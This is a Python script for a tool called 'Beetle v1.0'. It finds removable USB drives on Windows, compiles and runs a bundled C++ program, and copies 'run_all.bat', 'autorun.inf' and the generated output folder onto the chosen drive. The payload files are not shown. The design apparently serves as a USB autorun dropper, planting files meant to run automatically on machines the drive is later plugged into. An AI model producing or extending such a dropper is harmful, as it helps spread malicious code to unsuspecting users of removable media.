import os
import shutil
import string
import subprocess
import win32api
import win32file
import pyinputplus as pyip


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
END = '\033[0m'


def banner():
    beetle = fr'''{GREEN}
                           m
   $m                mm            m
    "$mmmmm        m$"    mmmmmmm$"
          """$m   m$    m$""""""
        mmmmmmm$$$$$$$$$"mmmm
  mmm$$$$$$$$$$$$$$$$$$ m$$$$m  "    m  "
$$$$$$$$$$$$$$$$$$$$$$  $$$$$$"$$$
 mmmmmmmmmmmmmmmmmmmmm  $$$$$$$$$$
 $$$$$$$$$$$$$$$$$$$$$  $$$$$$$"""  m
 "$$$$$$$$$$$$$$$$$$$$$ $$$$$$  "      "
     """""""$$$$$$$$$$$m """"
       mmmmmmmm"  m$   "$mmmmm
     $$""""""      "$     """"""$$
   m$"               "m           "$m{END}

            {RED}Beetle v1.0{END}
    '''

    print(beetle)


def find_usb_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    usb_drives = []

    for drive in drives:
        drive_type = win32file.GetDriveType(drive)
        if drive_type == win32file.DRIVE_REMOVABLE:
            usb_drives.append(drive)

    return usb_drives


def select_usb_drive(usb_drives):
    while True:
        try:
            print('Available USB drives:')
            for i, usb_drive in enumerate(usb_drives):
                print(f' {GREEN}{i+1}. {usb_drive}{END}')

            choice = pyip.inputInt(
                prompt='\nSelect a USB drive: ', min=1, max=len(usb_drives))
            return usb_drives[choice - 1]
        except pyip.RetryLimitException or pyip.TimeoutException:
            print('Invalid choice')


def compile_cpp_scripts():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    cpp_file = os.path.join(script_dir, 'complier', 'CompileAllFiles.cpp')
    output_dir = os.path.join(script_dir, 'output')

    try:
        subprocess.check_call(['g++', cpp_file, '-o', 'compile.exe'])
        subprocess.check_call(['compile.exe'])
        print('Compilation and execution completed successfully')
    except subprocess.CalledProcessError as e:
        print(f'Error occurred during compilation or execution: {e}')
    finally:
        if os.path.exists('compile.exe'):
            os.remove('compile.exe')


def copy_files_to_usb(usb_drive):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    source_files = [
        os.path.join(script_dir, 'run_all.bat'),
        os.path.join(script_dir, 'autorun.inf')
    ]
    source_folder = os.path.join(script_dir, 'output')
    destination_folder = os.path.join(usb_drive, 'output')

    try:
        for source_file in source_files:
            shutil.copy(source_file, usb_drive)
        shutil.copytree(source_folder, destination_folder)

        print(f'Files copied to: {usb_drive}')
    except Exception as e:
        print(f'Failed to copy files to {usb_drive}: {e}')


def main():
    try:
        banner()

        usb_drives = find_usb_drives()
        if len(usb_drives) == 0:
            print('No USB drives found')
            return

        usb_drive = select_usb_drive(usb_drives)

        compile_cpp_scripts()

        copy_files_to_usb(usb_drive)

    except KeyboardInterrupt:
        print('\nExiting...')
        return


if __name__ == '__main__':
    main()
